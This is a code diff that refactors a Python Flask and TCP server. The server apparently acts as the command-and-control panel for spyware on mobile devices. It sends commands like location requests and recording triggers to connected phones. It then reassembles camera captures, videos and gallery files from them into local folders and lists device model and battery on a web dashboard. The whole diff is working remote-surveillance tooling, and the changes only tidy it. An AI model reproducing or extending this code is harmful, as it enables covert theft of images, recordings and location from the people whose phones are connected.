@@ -15,8 +15,7 @@ clients = {}
 clients_lock = threading.Lock()
 file_transfers = {}
 
-UPLOAD_FOLDER = 'uploads'
-for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads', UPLOAD_FOLDER]:
+for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
     if not os.path.exists(folder):
         os.makedirs(folder)
 
@@ -25,8 +24,7 @@ def add_log(message):
     formatted_msg = f"[{timestamp}] {message}"
     print(formatted_msg)
     server_logs.insert(0, formatted_msg)
-    if len(server_logs) > 200:
-        server_logs.pop()
+    if len(server_logs) > 200: server_logs.pop()
 
 def create_initial_ui_data():
     return {
@@ -39,8 +37,7 @@ def create_initial_ui_data():
 # --- Data Handlers ---
 def handle_incoming_data(data, client_id):
     with clients_lock:
-        if client_id not in clients:
-            return
+        if client_id not in clients: return
         try:
             payload = json.loads(data).get('data', {})
             log_type = payload.get('type', 'UNKNOWN')
@@ -69,42 +66,32 @@ def handle_incoming_data(data, client_id):
                 add_log(f"[{client_id}] Received {log_type}")
             elif 'CHUNK' in log_type or 'END' in log_type:
                 handle_file_transfer(payload, log_type, client_id)
-            else:
-                add_log(f"[{client_id}] Msg: {log_type}")
-
-        except Exception as e:
-            add_log(f"[ERROR] Parsing data for {client_id}: {e}")
+        except Exception as e: add_log(f"[ERROR] Parsing data: {e}")
 
 def handle_file_transfer(payload, log_type, client_id):
     global file_transfers
     if 'CHUNK' in log_type:
         chunk_data = payload.get('chunk_data', {})
         filename = chunk_data.get('filename')
-        if filename:
-            file_transfers.setdefault(filename, []).append(chunk_data.get('chunk'))
+        if filename: file_transfers.setdefault(filename, []).append(chunk_data.get('chunk'))
     elif 'END' in log_type:
         filename = payload.get('file')
         if filename and filename in file_transfers:
             folder = 'device_downloads'
             if 'GALLERY' in log_type: folder = 'gallery_downloads'
-            if 'CAMERA' in log_type: folder = 'captured_images'
+            if 'CAMERA' in log_type or filename.endswith('.mp4'): folder = 'captured_images'
             
             save_path = os.path.join(folder, secure_filename(filename))
             try:
                 full_base64_data = "".join(file_transfers.pop(filename))
-                with open(save_path, 'wb') as f:
-                    f.write(base64.b64decode(full_base64_data))
+                with open(save_path, 'wb') as f: f.write(base64.b64decode(full_base64_data))
                 add_log(f"[DOWNLOAD] {client_id} saved {filename}")
-                
                 with clients_lock:
-                    if 'CAMERA' in log_type:
-                        if filename.endswith('.mp4'):
-                            clients[client_id]['ui_data']['last_video'] = filename
-                            clients[client_id]['ui_data']['record_status'] = 'done'
-                        else:
-                            clients[client_id]['ui_data']['camera_image'] = filename
-            except Exception as e:
-                add_log(f"[ERROR] Saving file {filename}: {e}")
+                    if filename.endswith('.mp4'):
+                        clients[client_id]['ui_data']['last_video'] = filename
+                        clients[client_id]['ui_data']['record_status'] = 'done'
+                    else: clients[client_id]['ui_data']['camera_image'] = filename
+            except Exception as e: add_log(f"[ERROR] Saving file: {e}")
 
 # --- TCP Server ---
 def handle_client_connection(conn, client_id):
@@ -118,8 +105,7 @@ def handle_client_connection(conn, client_id):
             while '\n' in buffer:
                 line, buffer = buffer.split('\n', 1)
                 if line.strip(): handle_incoming_data(line.strip(), client_id)
-    except Exception as e:
-        add_log(f"[DEBUG] Client {client_id} error: {e}")
+    except Exception as e: add_log(f"[DEBUG] Client error: {e}")
     finally:
         with clients_lock:
             if client_id in clients: del clients[client_id]
@@ -137,8 +123,7 @@ def tcp_listener():
         try:
             conn, addr = server.accept()
             client_id = f"{addr[0]}:{addr[1]}"
-            with clients_lock:
-                clients[client_id] = {'socket': conn, 'ui_data': create_initial_ui_data()}
+            with clients_lock: clients[client_id] = {'socket': conn, 'ui_data': create_initial_ui_data()}
             threading.Thread(target=handle_client_connection, args=(conn, client_id), daemon=True).start()
         except Exception as e: add_log(f"[!] TCP Listener Error: {e}")
 
@@ -152,12 +137,7 @@ def get_status():
         client_list = []
         for cid, client_data in clients.items():
             info = client_data['ui_data'].get('device_info', {})
-            client_list.append({
-                'id': cid,
-                'model': info.get('Model', 'Unknown'),
-                'battery': info.get('Battery', 'N/A'),
-                'info_str': f"{info.get('Manufacturer', '')} {info.get('Model', '')}"
-            })
+            client_list.append({'id': cid, 'model': info.get('Model', 'Unknown'), 'battery': info.get('Battery', 'N/A')})
     return jsonify({"logs": server_logs, "devices": client_list})
 
 @app.route('/api/client_data/<client_id>')
@@ -172,10 +152,9 @@ def send_command_route():
     client_id, cmd = req.get('client_id'), req.get('cmd')
     with clients_lock:
         if client_id not in clients: return jsonify({"status": "error"}), 404
-        client_data = clients[client_id]['ui_data']
         # Clear states
-        if cmd == 'get_location': client_data.update({"location_status": "requesting", "location_url": None})
-        if 'record_' in cmd: client_data.update({"record_status": "Recording initiated...", "last_video": None})
+        if cmd == 'get_location': clients[client_id]['ui_data'].update({"location_status": "requesting", "location_url": None})
+        if 'record_' in cmd: clients[client_id]['ui_data'].update({"record_status": "Recording initiated...", "last_video": None})
         try:
             clients[client_id]['socket'].sendall(f"{cmd}\n".encode())
             add_log(f"[SEND] to {client_id}: {cmd}")
@@ -188,7 +167,6 @@ def delete_file_route():
     path = os.path.join('captured_images', secure_filename(filename))
     if os.path.exists(path):
         os.remove(path)
-        add_log(f"[CLEANUP] Deleted {filename}")
         return jsonify({"status": "success"})
     return jsonify({"status": "not_found"}), 404
 
@@ -198,5 +176,4 @@ def serve_image(filename): return send_from_directory('captured_images', filenam
 if __name__ == '__main__':
     threading.Thread(target=tcp_listener, daemon=True).start()
     web_port = int(os.environ.get("PORT", 8080))
-    add_log(f"[*] Web Server starting on port {web_port}")
     app.run(host='0.0.0.0', port=web_port, debug=False)
